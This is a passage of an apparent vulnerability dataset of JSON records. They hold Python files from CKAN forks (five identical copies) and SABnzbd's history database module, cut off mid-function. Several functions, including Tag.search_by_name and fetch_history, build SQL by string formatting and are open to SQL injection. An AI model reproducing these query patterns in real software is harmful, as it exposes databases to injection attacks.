        "html_url": " https://github.com/ambagape/opendatang/blob/44854a42cfed687d512de47d6061cbc54208721e",
        "file_path": "/ckan/models/package.py",
        "source": "import sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Murseltje/CODPF1/blob/44854a42cfed687d512de47d6061cbc54208721e",
        "file_path": "/ckan/models/package.py",
        "source": "import sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/derilinx/ckan-docker-public/blob/44854a42cfed687d512de47d6061cbc54208721e",
        "file_path": "/ckan/models/package.py",
        "source": "import sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/MAPC/ckan/blob/44854a42cfed687d512de47d6061cbc54208721e",
        "file_path": "/ckan/models/package.py",
        "source": "import sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/july7vivian/myckan/blob/44854a42cfed687d512de47d6061cbc54208721e",
        "file_path": "/ckan/models/package.py",
        "source": "import sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/sabnzbd/sabnzbd/blob/6235174995a733394010c1253adfb220d5f9e733",
        "file_path": "/sabnzbd/database.py",
        "source": "#!/usr/bin/python -OO\n# Copyright 2008-2017 The SABnzbd-Team <team@sabnzbd.org>\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n\n\"\"\"\nsabnzbd.database - Database Support\n\"\"\"\n\ntry:\n    import sqlite3\nexcept:\n    try:\n        import pysqlite2.dbapi2 as sqlite3\n    except:\n        pass\n\nimport os\nimport time\nimport zlib\nimport logging\nimport sys\nimport threading\n\nimport sabnzbd\nimport sabnzbd.cfg\nfrom sabnzbd.constants import DB_HISTORY_NAME, STAGES\nfrom sabnzbd.encoding import unicoder\nfrom sabnzbd.bpsmeter import this_week, this_month\nfrom sabnzbd.decorators import synchronized\nfrom sabnzbd.misc import get_all_passwords, int_conv\n\nDB_LOCK = threading.RLock()\n\n\ndef convert_search(search):\n    \"\"\" Convert classic wildcard to SQL wildcard \"\"\"\n    if not search:\n        # Default value\n        search = ''\n    else:\n        # Allow * for wildcard matching and space\n        search = search.replace('*', '%').replace(' ', '%')\n\n    # Allow ^ for start of string and $ for end of string\n    if search and search.startswith('^'):\n        search = search.replace('^', '')\n        search += '%'\n    elif search and search.endswith('$'):\n        search = search.replace('$', '')\n        search = '%' + search\n    else:\n        search = '%' + search + '%'\n    return search\n\n\nclass HistoryDB(object):\n    \"\"\" Class to access the History database\n        Each class-instance will create an access channel that\n        can be used in one thread.\n        Each thread needs its own class-instance!\n    \"\"\"\n    # These class attributes will be accessed directly because\n    # they need to be shared by all instances\n    db_path = None        # Will contain full path to history database\n    done_cleaning = False # Ensure we only do one Vacuum per session\n\n    @synchronized(DB_LOCK)\n    def __init__(self):\n        \"\"\" Determine databse path and create connection \"\"\"\n        self.con = self.c = None\n        if not HistoryDB.db_path:\n            HistoryDB.db_path = os.path.join(sabnzbd.cfg.admin_dir.get_path(), DB_HISTORY_NAME)\n        self.connect()\n\n\n    def connect(self):\n        \"\"\" Create a connection to the database \"\"\"\n        create_table = not os.path.exists(HistoryDB.db_path)\n        self.con = sqlite3.connect(HistoryDB.db_path)\n        self.con.row_factory = dict_factory\n        self.c = self.con.cursor()\n        if create_table:\n            self.create_history_db()\n        elif not HistoryDB.done_cleaning:\n            # Run VACUUM on sqlite\n            # When an object (table, index, or trigger) is dropped from the database, it leaves behind empty space\n            # http://www.sqlite.org/lang_vacuum.html\n            HistoryDB.done_cleaning = True\n            self.execute('VACUUM')\n\n        self.execute('PRAGMA user_version;')\n        try:\n            version = self.c.fetchone()['user_version']\n        except TypeError:\n            version = 0\n        if version < 1:\n            # Add any missing columns added since first DB version\n            # Use \"and\" to stop when database has been reset due to corruption\n            _ = self.execute('PRAGMA user_version = 1;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN series TEXT;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN md5sum TEXT;')\n        if version < 2:\n            # Add any missing columns added since second DB version\n            # Use \"and\" to stop when database has been reset due to corruption\n            _ = self.execute('PRAGMA user_version = 2;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN password TEXT;')\n\n\n    def execute(self, command, args=(), save=False):\n        ''' Wrapper for executing SQL commands '''\n        for tries in xrange(5, 0, -1):\n            try:\n                if args and isinstance(args, tuple):\n                    self.c.execute(command, args)\n                else:\n                    self.c.execute(command)\n                if save:\n                    self.save()\n                return True\n            except:\n                error = str(sys.exc_value)\n                if tries >= 0 and 'is locked' in error:\n                    logging.debug('Database locked, wait and retry')\n                    time.sleep(0.5)\n                    continue\n                elif 'readonly' in error:\n                    logging.error(T('Cannot write to History database, check access rights!'))\n                    # Report back success, because there's no recovery possible\n                    return True\n                elif 'not a database' in error or 'malformed' in error or 'duplicate column name' in error:\n                    logging.error(T('Damaged History database, created empty replacement'))\n                    logging.info(\"Traceback: \", exc_info=True)\n                    self.close()\n                    try:\n                        os.remove(HistoryDB.db_path)\n                    except:\n                        pass\n                    self.connect()\n                    # Return False in case of \"duplicate column\" error\n                    # because the column addition in connect() must be terminated\n                    return 'duplicate column name' not in error\n                else:\n                    logging.error(T('SQL Command Failed, see log'))\n                    logging.debug(\"SQL: %s\", command)\n                    logging.info(\"Traceback: \", exc_info=True)\n                    try:\n                        self.con.rollback()\n                    except:\n                        logging.debug(\"Rollback Failed:\", exc_info=True)\n            return False\n\n    def create_history_db(self):\n        \"\"\" Create a new (empty) database file \"\"\"\n        self.execute(\"\"\"\n        CREATE TABLE \"history\" (\n            \"id\" INTEGER PRIMARY KEY,\n            \"completed\" INTEGER NOT NULL,\n            \"name\" TEXT NOT NULL,\n            \"nzb_name\" TEXT NOT NULL,\n            \"category\" TEXT,\n            \"pp\" TEXT,\n            \"script\" TEXT,\n            \"report\" TEXT,\n            \"url\" TEXT,\n            \"status\" TEXT,\n            \"nzo_id\" TEXT,\n            \"storage\" TEXT,\n            \"path\" TEXT,\n            \"script_log\" BLOB,\n            \"script_line\" TEXT,\n            \"download_time\" INTEGER,\n            \"postproc_time\" INTEGER,\n            \"stage_log\" TEXT,\n            \"downloaded\" INTEGER,\n            \"completeness\" INTEGER,\n            \"fail_message\" TEXT,\n            \"url_info\" TEXT,\n            \"bytes\" INTEGER,\n            \"meta\" TEXT,\n            \"series\" TEXT,\n            \"md5sum\" TEXT,\n            \"password\" TEXT\n        )\n        \"\"\")\n        self.execute('PRAGMA user_version = 2;')\n\n    def save(self):\n        \"\"\" Save database to disk \"\"\"\n        try:\n            self.con.commit()\n        except:\n            logging.error(T('SQL Commit Failed, see log'))\n            logging.info(\"Traceback: \", exc_info=True)\n\n    def close(self):\n        \"\"\" Close database connection \"\"\"\n        try:\n            self.c.close()\n            self.con.close()\n        except:\n            logging.error(T('Failed to close database, see log'))\n            logging.info(\"Traceback: \", exc_info=True)\n\n    def remove_completed(self, search=None):\n        \"\"\" Remove all completed jobs from the database, optional with `search` pattern \"\"\"\n        search = convert_search(search)\n        logging.info('Removing all completed jobs from history')\n        return self.execute(\"\"\"DELETE FROM history WHERE name LIKE ? AND status = 'Completed'\"\"\", (search,), save=True)\n\n    def get_failed_paths(self, search=None):\n        \"\"\" Return list of all storage paths of failed jobs (may contain non-existing or empty paths) \"\"\"\n        search = convert_search(search)\n        fetch_ok = self.execute(\"\"\"SELECT path FROM history WHERE name LIKE ? AND status = 'Failed'\"\"\", (search,))\n        if fetch_ok:\n            return [item.get('path') for item in self.c.fetchall()]\n        else:\n            return []\n\n    def remove_failed(self, search=None):\n        \"\"\" Remove all failed jobs from the database, optional with `search` pattern \"\"\"\n        search = convert_search(search)\n        logging.info('Removing all failed jobs from history')\n        return self.execute(\"\"\"DELETE FROM history WHERE name LIKE ? AND status = 'Failed'\"\"\", (search,), save=True)\n\n    def remove_history(self, jobs=None):\n        \"\"\" Remove all jobs in the list `jobs`, empty list will remove all completed jobs \"\"\"\n        if jobs is None:\n            self.remove_completed()\n        else:\n            if not isinstance(jobs, list):\n                jobs = [jobs]\n\n            for job in jobs:\n                self.execute(\"\"\"DELETE FROM history WHERE nzo_id=?\"\"\", (job,))\n                logging.info('Removing job %s from history', job)\n\n        self.save()\n\n    def auto_history_purge(self):\n        \"\"\" Remove history items based on the configured history-retention \"\"\"\n        if sabnzbd.cfg.history_retention() == \"0\":\n            return\n\n        if sabnzbd.cfg.history_retention() == \"-1\":\n            # Delete all non-failed ones\n            self.remove_completed()\n\n        if \"d\" in sabnzbd.cfg.history_retention():\n            # How many days to keep?\n            days_to_keep = int_conv(sabnzbd.cfg.history_retention().strip()[:-1])\n            seconds_to_keep = int(time.time()) - days_to_keep*3600*24\n            if days_to_keep > 0:\n                logging.info('Removing completed jobs older than %s days from history', days_to_keep)\n                return self.execute(\"\"\"DELETE FROM history WHERE status = 'Completed' AND completed < ?\"\"\", (seconds_to_keep,), save=True)\n        else:\n            # How many to keep?\n            to_keep = int_conv(sabnzbd.cfg.history_retention())\n            if to_keep > 0:\n                logging.info('Removing all but last %s completed jobs from history', to_keep)\n                return self.execute(\"\"\"DELETE FROM history WHERE id NOT IN ( SELECT id FROM history WHERE status = 'Completed' ORDER BY completed DESC LIMIT ? )\"\"\", (to_keep,), save=True)\n\n\n    def add_history_db(self, nzo, storage, path, postproc_time, script_output, script_line):\n        \"\"\" Add a new job entry to the database \"\"\"\n        t = build_history_info(nzo, storage, path, postproc_time, script_output, script_line)\n\n        if self.execute(\"\"\"INSERT INTO history (completed, name, nzb_name, category, pp, script, report,\n        url, status, nzo_id, storage, path, script_log, script_line, download_time, postproc_time, stage_log,\n        downloaded, completeness, fail_message, url_info, bytes, series, md5sum, password)\n        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\"\"\", t):\n            self.save()\n        logging.info('Added job %s to history', nzo.final_name)\n\n    def fetch_history(self, start=None, limit=None, search=None, failed_only=0, categories=None):\n        \"\"\" Return records for specified jobs \"\"\"\n        search = convert_search(search)\n\n        post = ''\n        if categories:\n            categories = ['*' if c == 'Default' else c for c in categories]\n            post = \" AND (CATEGORY = '\"\n            post += \"' OR CATEGORY = '\".join(categories)\n            post += \"' )\"\n        if failed_only:\n            post += ' AND STATUS = \"Failed\"'\n\n        cmd = 'SELECT COUNT(*) FROM history WHERE name LIKE ?'\n        res = self.execute(cmd + post, (search,))\n        total_items = -1\n        if res:\n            try:\n                total_items = self.c.fetchone().get('COUNT(*)')\n            except AttributeError:\n                pass\n\n        if not start:\n            start = 0\n        if not limit:\n            limit = total_items\n\n        t = (search, start, limit)\n        cmd = 'SELECT * FROM history WHERE name LIKE ?'\n        fetch_ok = self.execute(cmd + post + ' ORDER BY completed desc LIMIT ?, ?', t)\n\n        if fetch_ok:\n            items = self.c.fetchall()\n        else:\n            items = []\n\n        fetched_items = len(items)\n\n        # Unpack the single line stage log\n        # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n        items = [unpack_history_info(item) for item in items]\n\n        return (items, fetched_items, total_items)\n\n    def have_episode(self, series, season, episode):\n        \"\"\" Check whether History contains this series episode \"\"\"\n        total = 0\n        series = series.lower().replace('.', ' ').replace('_', ' ').replace('  ', ' ')\n        if series and season and episode:\n            pattern = '%s/%s/%s' % (series, season, episode)\n            res = self.execute(\"select count(*) from History WHERE series = ? AND STATUS != 'Failed'\", (pattern,))\n            if res:\n                try:\n                    total = self.c.fetchone().get('count(*)')\n                except AttributeError:\n                    pass\n        return total > 0\n\n    def have_md5sum(self, md5sum):\n        \"\"\" Check whether this md5sum already in History \"\"\"\n        total = 0\n        res = self.execute(\"select count(*) from History WHERE md5sum = ? AND STATUS != 'Failed'\", (md5sum,))\n        if res:\n            try:\n                total = self.c.fetchone().get('count(*)')\n            except AttributeError:\n                pass\n        return total > 0\n\n    def get_history_size(self):\n        \"\"\" Returns the total size of the history and\n            amounts downloaded in the last month and week\n        \"\"\"\n        # Total Size of the history\n        total = 0\n        if self.execute('''SELECT sum(bytes) FROM history'''):\n            try:\n                total = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        # Amount downloaded this month\n        # r = time.gmtime(time.time())\n        # month_timest = int(time.mktime((r.tm_year, r.tm_mon, 0, 0, 0, 1, r.tm_wday, r.tm_yday, r.tm_isdst)))\n        month_timest = int(this_month(time.time()))\n\n        month = 0\n        if self.execute('''SELECT sum(bytes) FROM history WHERE \"completed\">?''', (month_timest,)):\n            try:\n                month = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        # Amount downloaded this week\n        week_timest = int(this_week(time.time()))\n\n        week = 0\n        if self.execute('''SELECT sum(bytes) FROM history WHERE \"completed\">?''', (week_timest,)):\n            try:\n                week = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        return (total, month, week)\n\n    def get_script_log(self, nzo_id):\n        \"\"\" Return decompressed log file \"\"\"\n        data = ''\n        t = (nzo_id,)\n        if self.execute('SELECT script_log FROM history WHERE nzo_id=?', t):\n            try:\n                data = zlib.decompress(self.c.fetchone().get('script_log'))\n            except:\n                pass\n        return data\n\n    def get_name(self, nzo_id):\n        \"\"\" Return name of the job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        name = ''\n        if self.execute('SELECT name FROM history WHERE nzo_id=?', t):\n            try:\n                name = self.c.fetchone().get('name')\n            except AttributeError:\n                pass\n        return name\n\n    def get_path(self, nzo_id):\n        \"\"\" Return the `incomplete` path of the job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        path = ''\n        if self.execute('SELECT path FROM history WHERE nzo_id=?', t):\n            try:\n                path = self.c.fetchone().get('path')\n            except AttributeError:\n                pass\n        return path\n\n    def get_other(self, nzo_id):\n        \"\"\" Return additional data for job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        if self.execute('SELECT * FROM history WHERE nzo_id=?', t):\n            try:\n                items = self.c.fetchall()[0]\n                dtype = items.get('report')\n                url = items.get('url')\n                pp = items.get('pp')\n                script = items.get('script')\n                cat = items.get('category')\n            except (AttributeError, IndexError):\n                return '', '', '', '', ''\n        return dtype, url, pp, script, cat\n\n\ndef dict_factory(cursor, row):\n    \"\"\" Return a dictionary for the current database position \"\"\"\n    d = {}\n    for idx, col in enumerate(cursor.description):\n        d[col[0]] = row[idx]\n    return d\n\n\n_PP_LOOKUP = {0: '', 1: 'R', 2: 'U', 3: 'D'}\ndef build_history_info(nzo, storage='', downpath='', postproc_time=0, script_output='', script_line=''):\n    \"\"\" Collects all the information needed for the database \"\"\"\n\n    if not downpath:\n        downpath = nzo.downpath\n    path = decode_factory(downpath)\n    storage = decode_factory(storage)\n    script_line = decode_factory(script_line)\n\n    flagRepair, flagUnpack, flagDelete = nzo.repair_opts\n    nzo_info = decode_factory(nzo.nzo_info)\n\n    url = decode_factory(nzo.url)\n\n    completed = int(time.time())\n    name = decode_factory(nzo.final_name)\n\n    nzb_name = decode_factory(nzo.filename)\n    category = decode_factory(nzo.cat)\n    pp = _PP_LOOKUP.get(sabnzbd.opts_to_pp(flagRepair, flagUnpack, flagDelete), 'X')\n    script = decode_factory(nzo.script)\n    status = decode_factory(nzo.status)\n    nzo_id = nzo.nzo_id\n    bytes = nzo.bytes_downloaded\n\n    if script_output:\n        # Compress the output of the script\n        script_log = sqlite3.Binary(zlib.compress(script_output))\n        #\n    else:\n        script_log = ''\n\n    download_time = decode_factory(nzo_info.get('download_time', 0))\n\n    downloaded = nzo.bytes_downloaded\n    completeness = 0\n    fail_message = decode_factory(nzo.fail_msg)\n    url_info = nzo_info.get('details', '') or nzo_info.get('more_info', '')\n\n    # Get the dictionary containing the stages and their unpack process\n    stages = decode_factory(nzo.unpack_info)\n    # Pack the dictionary up into a single string\n    # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n    lines = []\n    for key, results in stages.iteritems():\n        lines.append('%s:::%s' % (key, ';'.join(results)))\n    stage_log = '\\r\\n'.join(lines)\n\n    # Reuse the old 'report' column to indicate a URL-fetch\n    report = 'future' if nzo.futuretype else ''\n\n    # Analyze series info only when job is finished\n    series = u''\n    if postproc_time:\n        seriesname, season, episode, dummy = sabnzbd.newsunpack.analyse_show(nzo.final_name)\n        if seriesname and season and episode:\n            series = u'%s/%s/%s' % (seriesname.lower(), season, episode)\n\n    # See whatever the first password was, for the Retry\n    password = ''\n    passwords = get_all_passwords(nzo)\n    if passwords:\n        password = passwords[0]\n\n  